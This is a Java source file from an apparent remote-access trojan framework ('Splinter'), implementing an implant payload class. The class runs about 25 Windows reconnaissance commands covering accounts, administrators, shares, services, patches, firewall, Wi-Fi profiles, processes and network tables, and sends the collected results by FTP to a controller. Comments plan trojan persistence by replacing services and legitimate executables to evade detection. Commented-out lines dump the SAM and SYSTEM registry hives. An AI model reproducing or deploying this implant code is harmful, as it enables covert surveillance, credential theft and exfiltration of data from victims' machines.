/**
 * The purpose of this class to call various commands to better undestand this system and the network this system is attached to
 * 
 * 
 *we proceed by enumerating the system/network, saving to a temp file, FTP'ing this file over to the controller, and then deleting the file upon completion
 *
 *since this is a enumeration, we will use a static file name, duplicate files will be overwritten!
 *
 *ASSUMPTIONS: we assume the net, set, system info ipconfig commands all work ok
 *
 *NOTE: later interrogation will need to be made first to ensure the system has wmic and how to better interrogate the system based on OS... right now, we assume Windows 7 type of system
 * 
 * @author Solomon Sonya
 */

package Implant.Payloads;


import Controller.GUI.*;
import Controller.Drivers.Drivers;
import GeoLocation.GeoThread;
import GeoLocation.ShowMap;
import Implant.Driver;
import Implant.ProcessHandlerThread;
import Implant.FTP.FTP_ServerSocket;
import Implant.FTP.FTP_Thread_Sender;
import RunningProcess.*;
import java.io.*;

import javax.crypto.*;
import java.net.*;
import java.security.*;
import java.util.*;
import javax.swing.*;
import javax.swing.Timer;
import java.awt.*;
import java.awt.event.*;

public class EnumerateSystem extends Thread implements Runnable 
{
	public static final String strMyClassName = "EnumerateSystem";
	
	String strFTP_Address = "";
	int PORT = 0;
	File fleSaveDirectory = null;
	File fleEnumeration = null;
	String enumFileExtension = ".tmp";
	PrintWriter pwOut = null;
	PrintWriter sktOut = null;
	String outputDirectory = "";
	
	double percentTot = 100/ 25;// 25 because we have approx 25 function calls to enumerate system
	double percentComplete = 0.0;//used to be 4.0
	
	public static String ENUMERATE_WHOAMI = "whoami"; 
	public static String ENUMERATE_USER_ACCOUNT_WMIC = "wmic useraccount get /format:csv";
	public static String ENUMERATE_USER_ACCOUNT_NET = "net user";
	public static String ENUMERATE_LOCALGROUP_NET = "net localgroup administrators";	
	public static String ENUMERATE_SHARES_WMIC = "wmic share get /format:csv";
	public static String ENUMERATE_SHARES_NET = "net share";
	public static String ENUMERATE_NET_VIEW = "net view";
	public static String ENUMERATE_STARTUP_WMIC = "wmic startup get /format:csv";
	public static String ENUMERATE_STARTUP_NET = "net start";
	public static String ENUMERATE_LOGICAL_DRIVE = "wmic logicaldisk get /format:csv";
	public static String ENUMERATE_SERVICE_WMIC = "wmic service get /format:csv"; //SOLO, LOOK AT THIS ONE AGAIN, EXECUTE WITHOUT THE  CSV FORMAT, THEN CONSIDER ATTACKS TO RUN BY SHUTTING DOWN A SERVICE, AND POSSIBLY RESTARTING THE SYSTEM, OR SHUTTING DOWN A SERVICE, REPLACING SPLINTER AS THIS SERVICE, THEN STARTING THE SERVICE AGAIN TO EVADE DETECTION.  ALSO CREATE A SIMPLE JTABLE INTERFACE TO VIEW THIS INFORMATION AND A GUI TO TO STOP IT AND SUCH!
	public static String ENUMERATE_SQ_QUERY = "sc query";
	public static String ENUMERATE_OS_WMIC = "wmic os get /format:csv"; //SOLO, CONFIGURE TO DISPLAY IN A GUI FRAME, WE'LL CALL IT GRAB SYSTEM SECURITY STATE
	public static String ENUMERATE_CPU_WMIC = "wmic CPU get /format:csv";//SOLO, CONFIGURE TO DISPLAY IN A GUI FRAME, WE'LL CALL IT GRAB SYSTEM SECURITY STATE
	public static String ENUMERATE_PATCHES = "wmic qfe get /format:csv";//SOLO, CONFIGURE TO DISPLAY IN A GUI FRAME, WE'LL CALL IT GRAB SYSTEM SECURITY STATE
	public static String ENUMERATE_SYSTEMINFO = "systeminfo";
	
			//
			//	NOT IMPLEMENTED YET!!!
			//
			public static String ENUMERATE_SYSTEM_PLATFORM = "wmic csproduct get name";
			public static String ENUMERATE_SYSTEM_IdentyfingSerialNumber = "wmic csproduct get IdentifyingNumber";
			public static String ENUMERATE_SYSTEM_UUID = "wmic csproduct get UUID";
			public static String ENUMERATE_SYSTEM_VENDOR = "wmic csproduct get vendor";
			public static String ENUMERATE_SYSTEM_DRIVES = "wmic diskdrive get name,size,model";
			public static String ENUMERATE_SYSTEM_BIOS_SERIALNUMBER = "wmic bios get serialnumber";
			public static String ENUMERATE_SYSTEM_BIOS_INSTALLDATE = "wmic bios get description,version";
			public static String ENUMERATE_SYSTEM_BIOS_MANUFACTURER = "wmic bios get manufacturer";
			public static String ENUMERATE_SYSTEM_NETWORK_ADAPTERS = "wmic nic get NetEnabled,name,macaddress,guid,physicaladapter,NetConnectionID,PNPDeviceID,servicename";
			String ENUMERATE_OS_WMIC_FULL = "wmic os get BootDevice,BuildNumber,Caption,CodeSet,CSDVersion,EncryptionLevel,InstallDate,Manufacturer,MaxProcessMemorySize,Name,OSArchitecture,SerialNumber,SystemDirectory,Version,WindowsDirectory,SystemDirectory/format:csv";
			String ENUMERATE_CPU_WMIC_FULL = "wmic CPU get Caption,CurrentClockSpeed,DataWidth,DeviceID,L2CacheSize,L3CacheSize,Manufacturer,Name,NumberOfCores,NumberOfLogicalProcessors,ProcessorId,SystemName /format:csv";
			
			public static String ENUMERATE_SYSTEM_CPUSPEED = "wmic cpu get currentclockspeed";
			public static String ENUMERATE_SYSTEM_L2CacheSize = "wmic cpu get L2CacheSize";
			public static String ENUMERATE_SYSTEM_L3CacheSize = "wmic cpu get L3CacheSize";
			public static String ENUMERATE_SYSTEM_CPU_NAME = "wmic cpu get name";
			public static String ENUMERATE_SYSTEM_NUMBER_OF_CORES = "wmic cpu get numberofcores";
			public static String ENUMERATE_SYSTEM_CPU_ID = "wmic cpu get ProcessorId";
			public static String ENUMERATE_SYSTEM_MEMORY = "wmic memorychip get banklabel,capacity,caption,description,devicelocator,manufacturer,partnumber,serialnumber,speed,tag,totalwidth";
			public static String ENUMERATE_SYSTEM_MOTHERBOARD_MAX_MEM = "wmic memphysical get maxcapacity";
			public static String ENUMERATE_SYSTEM_LAST_LOGON = "wmic netlogin get lastlogon";
			public static String ENUMERATE_SYSTEM_HARD_DISK_DATA = "wmic volume get serialnumber,capacity,driveletter,deviceid,filesystem";
			public static String ENUMERATE_SYSTEM_USER_ACCT_SSID = "wmic useraccount get caption,name,passwordrequired,sid";
			public static String ENUMERATE_SYSTEM_TIMEZONE = "wmic timezone get description";
			public static String ENUMERATE_SYSTEM_MOTHERBOARD_PCI_SLOTS = "wmic systemslot get tag,slotdesignation";
			public static String ENUMERATE_SYSTEM_SOUND = "wmic sounddev get caption,description,deviceid";
			public static String ENUMERATE_SYSTEM_PROCESS = "wmic process get"; //SOLO, THIS IS A GREAT ATTACK VECTOR!!!!!  "PROCESS STOMP -->" EXECUTE THIS COMMAND, THEN CHOOSE A PROGRAM THAT ALWAYS RUNS WITH NO PARAMETERS PASSED IN, THEN CREATE NEW SPLINTER INSTANCE WITH THE URL OR IP ADDRESS HARD CODED INTO IT, AND ONLY CONFIGURED TO ALLOW ONE INSTANCE TO RUN AT A TIME, THEN KILL ALL OF THESE LEGIT EXE'S, RENAME THE TRUE EXE, AND NOW PLACE SPLINTER_IMPLANT HERE WITH THE LEGIT EXE NAME.  THEN WAIT FOR THE USER TO RUN THE LEGIT PROGRAM. NOW WHEN LEGIT PROGRAM RUNS, SPLINTER WILL ACTUALLY RUN FIRST AND ATTEMPT TO CONNECT TO "UPDATE.EXE" UNDER THE LEGIT PROG NAME, ONCE ALLOWED TO CONNECT, OPEN THE LEGIT PROGRAM (NAMED SOMETHING ELSE) IN A SIMILAR WAY TO HOW WE LAUNCHED UAC. SO NOW OUR TROJAN IS RUNNING UNDER LEGIT PROGRAM NAME AND CONNECTED TO SPLINTER_CONTROLLER, AND THE LEGIT PROG IS RUNNING UNDER A DIFF NAME
			public static String ENUMERATE_SYSTEM_PRINTER = "wmic printer get name";
			public static String ENUMERATE_SYSTEM_OS = "wmic os get caption,csdversion,installdate,lastbootuptime,numberofusers,osarchitecture,serialnumber,windowsdirectory,version";
			public static String ENUMERATE_SYSTEM_OS_SERVICE_PACK = "wmic os get csdversion";
			public static String ENUMERATE_SYSTEM_OS_SERIALNUMBER = "wmic os get serialnumber";
	
	public static String ENUMERATE_IPCONFIG = "ipconfig /all";
	public static String ENUMERATE_DNS = "ipconfig /displaydns";
	public static String ENUMERATE_FIREWALL = "netsh advfirewall show allprofiles";
	public static String ENUMERATE_WIRELESS_PROFILE = "netsh wlan show profiles";
	public static String ENUMERATE_TASKLIST = "tasklist /v";
	public static String ENUMERATE_NETSTAT = "netstat -ano";
	public static String ENUMERATE_NETSTAT_R = "netstat -r";
	public static String ENUMERATE_ROUTE = "route print";
	public static String ENUMERATE_ARP = "arp -a";
	
	//ublic static String CMD_SAVE_REGISTRY_SAM 		= "reg save HKLM\\SAM sam /y > ";//we'll assume the file path by the program will be where we'll write out to
	//public static String CMD_SAVE_REGISTRY_SYSTEM 	= "reg save HKLM\\SYSTEM /y > "; //we'll assume the file path by the program will be where we'll write out to

	/**
	 * 
	 * @param outDirectory
	 * @param FTP_address
	 * @param prt
	 * @param socketOut
	 */
	
	
	public EnumerateSystem(String outDirectory, String FTP_address, int prt, PrintWriter socketOut)
	{
		strFTP_Address = FTP_address;
		PORT = prt;
		
		sktOut = socketOut;
		outputDirectory = outDirectory;
	}
	
	public void run()
	{
		enumerateSystem(outputDirectory, sktOut);
		
		Driver.sop("... --> Done!\n\nENUMERATION COMPLETE. Searching for Controller to FTP enum results...");
		sktOut.println("ENUMERATION COMPLETE. Searching for Controller to FTP enum results...");
		sktOut.flush();
															
		FTP_Thread_Sender FTP_Sender = new FTP_Thread_Sender(true, false, strFTP_Address, PORT, FTP_ServerSocket.maxFileReadSize_Bytes, fleEnumeration, sktOut, true, FTP_ServerSocket.FILE_TYPE_ORDINARY, null);
		FTP_Sender.start();
	}
	
	/**
	 * Driver class for system Enumeation
	 * @return
	 */
	public boolean enumerateSystem(String enumerationOutDirectory, PrintWriter pwSkt)
	{
		try
		{
			//Attempt to create a new file at this location
			
			System.gc();
			
			//yeah... so as of 11 sep 13, i am going to change from the controller dictating screenImgSavePath where the save path to be... to us choosing it ourselves
			
			enumerationOutDirectory = Driver.systemMap.strTEMP;
			
			if(enumerationOutDirectory.endsWith(Driver.fileSeperator))
			{
				fleEnumeration = new File(enumerationOutDirectory + ""+System.currentTimeMillis() + "_" + "enum" + enumFileExtension);
			}
			else
			{
				fleEnumeration = new File(enumerationOutDirectory + Driver.fileSeperator + ""+System.currentTimeMillis() + "_" + "enum" + enumFileExtension);
			}
			
			/*if(enumerationOutDirectory == null || enumerationOutDirectory.trim().equals(""))
			{
				//fleEnumeration = new File("." + Driver.fileSeperator, ""+Driver.getTimeStamp_Without_Date() + "_" + "enum" + enumFileExtension);
				fleEnumeration = new File("." + Driver.fileSeperator, ""+System.currentTimeMillis() + "_" + "enum" + enumFileExtension);
			}
			else//directory is good, create the file at this directory
			{
				fleEnumeration = new File(enumerationOutDirectory, ""+System.currentTimeMillis() + "_" + "enum" + enumFileExtension);
			}*/
			
			//Assuming our temp file was created, open a print writer on the file (this will really drop the file on the system, if successful, we'll proceed with the enumeration
			this.pwOut = new PrintWriter(new BufferedOutputStream(new FileOutputStream(fleEnumeration.toString())));
				
			/*********************************************************************************************
			 * WRITE SYSTEM TIME
			 *********************************************************************************************/
			pwOut.println("Commencing System Enumeration started @ " + Driver.getTimeStamp_Updated() + "\n\n");
			Driver.sop("Commencing System Enumeration started @ " + Driver.getTimeStamp_Updated() + "\n\n");
			pwSkt.println("Commencing System Enumeration started @ " + Driver.getTimeStamp_Updated());
			pwSkt.flush();
			
			
			//at this point, file creation was successful!!!! call the various methods to achieve 
			Driver.sp("Percent complete: " );
			executeEnumerationCommand(pwOut, "WHOAMI", ENUMERATE_WHOAMI);													
			executeEnumerationCommand(pwOut, "ACCOUNTS", ENUMERATE_USER_ACCOUNT_NET);										
			executeEnumerationCommand(pwOut, "ACCOUNTS - VERBOSE", ENUMERATE_USER_ACCOUNT_WMIC);
			executeEnumerationCommand(pwOut, "ADMIN GROUP ACCOUNT", ENUMERATE_LOCALGROUP_NET);
			executeEnumerationCommand(pwOut, "NET SHARES", ENUMERATE_SHARES_NET);
			executeEnumerationCommand(pwOut, "NET SHARES - VERBOSE", ENUMERATE_SHARES_WMIC);
			executeEnumerationCommand(pwOut, "NET VIEW", ENUMERATE_NET_VIEW);
			executeEnumerationCommand(pwOut, "LOGICAL DRIVE(S) - VERBOSE", ENUMERATE_LOGICAL_DRIVE);
			executeEnumerationCommand(pwOut, "STARUP SERVICES", ENUMERATE_STARTUP_NET);
			executeEnumerationCommand(pwOut, "STARTUP - VERBOSE", ENUMERATE_STARTUP_WMIC);
			executeEnumerationCommand(pwOut, "SERVICES - VERBOSE", ENUMERATE_SERVICE_WMIC);
			executeEnumerationCommand(pwOut, "SERVICES QUERY", ENUMERATE_SQ_QUERY);
			executeEnumerationCommand(pwOut, "OPERATING SYSTEM - VERBOSE", ENUMERATE_OS_WMIC);
			executeEnumerationCommand(pwOut, "CPU - VERBOSE", ENUMERATE_CPU_WMIC);
			executeEnumerationCommand(pwOut, "PATCH SUMMARY", ENUMERATE_PATCHES);
			executeEnumerationCommand(pwOut, "SYSTEM INFO", ENUMERATE_SYSTEMINFO);
			executeEnumerationCommand(pwOut, "IPCONFIG /ALL", ENUMERATE_IPCONFIG);
			executeEnumerationCommand(pwOut, "HOST DNS ENTRIES", ENUMERATE_DNS);
			executeEnumerationCommand(pwOut, "FIREWALL", ENUMERATE_FIREWALL);
			executeEnumerationCommand(pwOut, "WIRELESS PROFILE(S) IF APPLICABLE", ENUMERATE_WIRELESS_PROFILE);
			executeEnumerationCommand(pwOut, "TASKLIST", ENUMERATE_TASKLIST);
			executeEnumerationCommand(pwOut, "NETSTAT", ENUMERATE_NETSTAT);
			executeEnumerationCommand(pwOut, "NET ROUTE", ENUMERATE_NETSTAT_R);
			executeEnumerationCommand(pwOut, "ROUTE", ENUMERATE_ROUTE);
			executeEnumerationCommand(pwOut, "ARP TABLE", ENUMERATE_ARP);		
			pwOut.flush();
			
			pwOut.println("############################################################################");
			pwOut.println("############################################################################");
			pwOut.println("##");			
			pwOut.println("## ----->>>>>  " + "ENUMERATION COMPLETE!!!");
			pwOut.println("##");
			pwOut.println("############################################################################");
			pwOut.println("############################################################################");
			
			//remember to flush the print writer!
			pwOut.flush();
			pwOut.close();
			
			
			
			//FTP the file, and have FTP delete the file when complete!
			
			return true;
		}
		catch(Exception e)
		{
			Driver.eop("enumerateSystem", strMyClassName, e, e.getLocalizedMessage(), false);
			Driver.sop("Unable to complete system enumeration!!!");
			
			
			
			if(pwSkt != null)
			{
				try{pwSkt.println("PUNT!!!  Unable to complete system interrogation!!!!!");}catch(Exception ee){}
			}
			
		}
		
		try{pwOut.close();}catch(Exception eee){}
		return false;
	}
	
	public boolean executeEnumerationCommand(PrintWriter handle, String header, String command)
	{
		try
		{
			Driver.sp("..." + (percentComplete +=percentTot) + "%");
			
			handle.println("############################################################################");
			handle.println("############################################################################");
			handle.println("##");			
			handle.println("## " + header);
			handle.println("##");
			handle.println("############################################################################");
			handle.println("############################################################################");
			handle.println(" ");	
			handle.flush();
			
			//Execute command
			Process process = Runtime.getRuntime().exec(command);
			
			//note!!!! we still have to clear the process buffer, otherwise the system will return "ERROR: Not enough storage is available to complete this operation." <---- this is because all data is consumed since the process buffer is still full.  so to get around this, we will simply call the processhandlers to drain the process buffers
			
			BufferedReader process_IN = new BufferedReader(new InputStreamReader(process.getInputStream()));
			BufferedReader process_IN_ERROR  = new BufferedReader(new InputStreamReader(process.getErrorStream()));
						
			ProcessHandlerThread process_INPUT = new ProcessHandlerThread(command, process, process_IN, handle);
			ProcessHandlerThread process_INPUT_ERROR = new ProcessHandlerThread(command, process, process_IN_ERROR, handle); 
			
			process_INPUT.start();
			process_INPUT_ERROR.start();
			
			handle.println(" ");
			handle.println(" ");
			
			//process_IN.close();
			//process_IN_ERROR.close();
			System.gc();
			
			handle.flush();
			
			return true;
		}
		catch(Exception e)
		{
			Driver.eop("executeEnumerationCommand", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
		return false;
	}
	
	
	
	
	
}
